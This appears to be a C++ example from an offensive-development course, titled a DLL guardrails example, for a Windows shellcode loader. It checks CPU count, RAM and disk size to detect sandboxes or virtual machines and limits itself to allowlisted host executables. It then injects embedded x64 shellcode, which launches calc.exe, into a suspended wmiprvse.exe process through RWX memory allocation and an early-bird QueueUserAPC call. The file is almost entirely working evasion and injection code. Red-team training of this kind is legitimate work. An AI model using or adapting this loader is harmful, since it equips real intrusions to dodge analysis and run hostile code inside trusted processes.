#include <windows.h>
#include <string>
#include <vector>
#include <algorithm>

bool isPhysicalSystem() {
    // Check CPU
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) {
        return false;
    }

    // Check RAM
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = static_cast<DWORD>(memoryStatus.ullTotalPhys / (1024 * 1024));
    if (RAMMB < 2048) {
        return false;
    }

    // Check HDD
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    if (DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL)) {
        DWORD diskSizeGB = static_cast<DWORD>(pDiskGeometry.Cylinders.QuadPart *
            static_cast<ULONG>(pDiskGeometry.TracksPerCylinder) *
            static_cast<ULONG>(pDiskGeometry.SectorsPerTrack) *
            static_cast<ULONG>(pDiskGeometry.BytesPerSector) / (1024 * 1024 * 1024));

        CloseHandle(hDevice);
        return diskSizeGB >= 95;
    }

    CloseHandle(hDevice);
    return false;
}

void doStuff(){
	unsigned char buf[] = 
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
		"\x63\x2e\x65\x78\x65\x00";
	
	SIZE_T shellSize = sizeof(buf);
	STARTUPINFOA si = {0};
	PROCESS_INFORMATION pi = {0};

	CreateProcessA("C:\\Windows\\System32\\wbem\\wmiprvse.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;
	
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	
	WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);	
	ResumeThread(threadHandle);
}

// White Knight Labs - Offensive Development Course
// DLL Guardrails Example

// This function extracts the file name from a given path
// It is used later to determine the executable name loading the DLL.
std::string ExtractFileName(const std::string& path) {
    size_t lastSlashPos = path.find_last_of("\\/");
    return lastSlashPos != std::string::npos ? path.substr(lastSlashPos + 1) : path;
}

bool validate_name(){
	CHAR processPath[MAX_PATH] = { 0 };

    // List of executables allowed to load this code
    std::vector<std::string> allowedExecutables = {
        "Word.exe",   // Example allowed executable
        "Chrome.exe", // Another example allowed executable
        "validate_name.exe",  // Placeholder for additional executables
        "2_validate_name_and_physical_system.exe"// Add any other executable names as needed
    };

    GetModuleFileNameA(NULL, processPath, MAX_PATH);
    std::string executableName = ExtractFileName(processPath);

	if (std::find(allowedExecutables.begin(), allowedExecutables.end(), executableName) == allowedExecutables.end())
	// Prevent our code from being loaded by an unknown or unauthorized executable
		return FALSE;
	else
		return true;
}

int main(){

	if (validate_name()) {
		printf("Name validated\n");
		
		if (isPhysicalSystem()){
			printf("Physical system! validated\n");
			// run stuff !
			printf("No one is watching. WOOHOO!\n");
			doStuff();
		} else {
		// Prevent our code from being loaded by an unknown or unauthorized executable
		printf("This is not a physical system!\nBailing...\n");
		return FALSE;
		}

	} else {
		// Prevent our code from being loaded by an unknown or unauthorized executable
		
		printf("Not running in one of the whitelisted executables!\nBailing...\n");
		return FALSE;
		
	}
	return 0;
}